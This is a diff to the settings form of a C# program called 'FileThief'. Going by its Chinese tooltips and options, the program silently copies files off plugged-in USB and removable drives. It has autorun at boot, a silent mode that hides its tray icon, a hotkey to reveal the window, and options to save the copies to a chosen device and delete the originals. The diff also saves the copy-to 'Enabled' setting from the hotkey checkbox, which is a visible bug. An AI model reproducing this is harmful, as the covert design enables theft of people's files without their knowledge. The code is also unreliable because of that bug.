@@ -13,7 +13,7 @@ namespace FileThief
         {
             InitializeComponent();
         }
-        
+
         private void frmSettings_Load(object sender, EventArgs e)
         {
             // Load Tooltip
@@ -28,8 +28,8 @@ namespace FileThief
             toolTip1.SetToolTip(chkLogInfo, "设置是否记录普通信息\n如复制成功等");
             toolTip1.SetToolTip(chkAutoRun, "设置是否开机自动运行程序\n需要管理员权限");
             toolTip1.SetToolTip(chkSilent, "设置是否以静默模式运行程序\n在静默模式下，不会在任务栏托盘显示图标\n静默模式下可以通过设置的热键显示设置窗口");
-            toolTip1.SetToolTip(lblWlVolume, "可以通过在可移动设备根目录创建白名单文件来跳过对整个设备的扫描\n如果设置了「将复制的文件保存到指定设备」则必须开启此选项");
-            toolTip1.SetToolTip(lblHotkey,"热键可以用于在任何情况下显示设置窗口");
+            toolTip1.SetToolTip(chkWhitelist, "可以通过在可移动设备根目录创建白名单文件来跳过对整个设备的扫描\n如果设置了「将复制的文件保存到指定设备」则必须开启此选项");
+            toolTip1.SetToolTip(chkHotkey,"热键可以用于在任何情况下显示设置窗口");
 
             // Load Config to GUI
             txtType.Text = ClsMain.CType;
@@ -42,14 +42,29 @@ namespace FileThief
             cbVolume.SelectedIndex = Convert.ToInt32(ClsMain.BLabel);
             chkLog.Checked= Convert.ToBoolean(Convert.ToInt32(ClsMain.ConLog));
             ManageCheckGroupBox(chkLog, gbLog);
+
             txtLogPath.Text = ClsMain.ConLogPath;
             chkLogErr.Checked=Convert.ToBoolean(Convert.ToInt32(ClsMain.ConLogErr));
             chkLogInfo.Checked= Convert.ToBoolean(Convert.ToInt32(ClsMain.ConLogInfo));
+
             chkAutoRun.Checked= Convert.ToBoolean(Convert.ToInt32(ClsMain.ConStartup));
             chkSilent.Checked= Convert.ToBoolean(Convert.ToInt32(ClsMain.ConSilent));
+
             chkUSBDisk.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConUsbDisk));
             chkUSBHD.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConUsbhd));
             chkROM.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConRom));
+
+            chkHotkey.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConHotkeyE));
+            hkcHotkey.Text = ClsMain.ConHotkey;
+            ManageCheckGroupBox(chkHotkey, gbHotkey);
+
+            chkWhitelist.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConWhitelist));
+            ManageCheckGroupBox(chkWhitelist, gbWhitelist);
+
+            chkCopyTo.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConCopyTo));
+            txtCopyToDevice.Text = ClsMain.ConCtDevice;
+            chkDelOri.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConDelOri));
+            ManageCheckGroupBox(chkCopyTo, gbCopyTo);
         }
 
         private void btnSave_Click(object sender, EventArgs e)
@@ -78,6 +93,13 @@ namespace FileThief
             ClsMain.WriteIni("DriverType", "ROM", Convert.ToInt32(chkROM.Checked).ToString(), ClsMain.StrConfig);
 
             ClsMain.WriteIni("Device", "Whitelist", Convert.ToInt32(chkWhitelist.Checked).ToString(), ClsMain.StrConfig);
+
+            ClsMain.WriteIni("Hotkey", "Enabled", Convert.ToInt32(chkHotkey.Checked).ToString(), ClsMain.StrConfig);
+            ClsMain.WriteIni("Hotkey","Hotkey",hkcHotkey.Text,ClsMain.StrConfig);
+
+            ClsMain.WriteIni("CopyTo", "Enabled", Convert.ToInt32(chkHotkey.Checked).ToString(), ClsMain.StrConfig);
+            ClsMain.WriteIni("CopyTo", "SaveDevice", txtCopyToDevice.Text, ClsMain.StrConfig);
+            ClsMain.WriteIni("CopyTo", "DeleteOriginalFiles", Convert.ToInt32(chkDelOri.Checked).ToString(), ClsMain.StrConfig);
 
             var bootStatus = ClsMain.SetAutoBoot(chkAutoRun.Checked);
             if (bootStatus == -1)
@@ -123,12 +145,12 @@ namespace FileThief
 
         private void chkHotkey_CheckedChanged(object sender, EventArgs e)
         {
-            
+            ManageCheckGroupBox(chkHotkey, gbHotkey);
         }
 
         private void chkCopyTo_CheckedChanged(object sender, EventArgs e)
         {
-            ManageCheckGroupBox(chkHotkey, gbHotkey);
+            ManageCheckGroupBox(chkCopyTo, gbCopyTo);
             if (chkCopyTo.Checked) chkWhitelist.Checked = true;
         }
 
